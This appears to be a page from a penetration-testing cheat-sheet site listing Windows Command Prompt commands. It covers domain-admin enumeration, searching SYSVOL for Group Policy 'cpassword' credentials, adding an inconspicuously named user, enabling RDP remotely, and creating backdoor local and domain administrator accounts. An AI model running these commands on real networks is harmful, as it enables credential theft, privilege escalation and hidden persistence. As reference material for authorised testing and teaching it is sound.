---
title : "cmd"
# pre : '<i class="fas fa-code"></i> '
description : "Microsoft Command Prompt."
date : 2020-07-09T12:52:37+02:00
# hidden : true
# draft : true
weight : 20
# tags : ['']
---

---

Command Prompt.

{{%resources fa_icon_class="far fa-file" pattern=".*(exe)"/%}}

### Show Domain Admins / Enterprise Admins

`net group "Domain Admins" /domain`

`net group "Enterprise Admins" /domain`

### Run CMD on non-domain joined machine as domain user

`runas /netonly /user:<DOMAIN>\<USER> cmd.exe`

Use the `/profile` flag for running the CMD in the context of the user explicitly on a domain joined system.

`runas /profile /user:<DOMAIN>\<USER> cmd.exe`

Or start an elevated prompt using CMD / PowerShell

`powershell -Command "Start-Process cmd -Verb RunAs"`

### Enable access to C-drive in Explorer

`subst z: c:\`

### Finding cpassword

`findstr /s /n /i /p cpassword \\<DOMAIN>\sysvol\*`

### Show privileges current user

```plain
$ whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
win10\johndo S-1-5-21-4192065701-4228146649-662612674-1001


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### List domain controllers (DC)

```cmd
$ nltest /dclist:offsec.nl

Get list of DCs in domain 'offsec.nl' from '\\DC2016.offsec.nl'.
    DC2008R2.offsec.nl [PDC]  [DS] Site: Default-First-Site-Name
      DC2016.offsec.nl        [DS] Site: Default-First-Site-Name
      DC2019.offsec.nl        [DS] Site: Default-First-Site-Name
The command completed successfully
```

### Add less visible user

Local admin required.

`net user $ LetMeIn123! /add /active:yes`

### Enable / disable Remote Desktop (RDP)

You can enable (remotely) Remote Desktop (RDP) by adjusting the register key. Tip: use 'smbexec.py' / 'wmiexec.py' to enable on remote system where RDP is not enabled. Or use the CrackMapExec module RDP see [CrackMapExec]({{< ref "tools/framework/crackmapexec" >}}).

Enable

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`

Disable

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f`

### Add Local Admin via CMD

Creation of the user 'NewLaForMe' - `net user NewLAForMe "NotThatStrongPassword@" /add /Y`

Adding the user to the group - `net localgroup Administrators NewLAForMe /add`

**Note:** If you try to create a local administrator account from Windows Recovery, this will not work. Follow the next steps to perform this action:

1. Click on the Start button, click on Power button, and click on restart while pressing shift;
2. In the new page, go to Troubleshoot > Advanced Options > Startup Settings > Restart; After this, the computer will restart and you can choose different Safe Mode Options;
3. Choose either option, **4. Enable Safe Mode**, **5. Enable Safe Mode with Networking**, or **6. Enable Safe Mode with Command Prompt**;
4. Perform the required actions, e.g. create a new account or change the password of an existing administrative account.

### Add Domain Admin / Enterprise Admin via CMD

Creation of the user 'NewDAForMe' - `net user NewDAForMe "NotThatStrongPassword@" /add /domain /Y`

Adding the user to the group - `net group "Domain Admins" NewDAForMe /add /domain` / `net group "Enterprise Admins" NewDAForMe /add /domain`

Set user status to Active - `net user NewDAForMe /active:yes /domain`

Set user expire date - `net user NewDAForMe /expires:07/19/23 /domain`
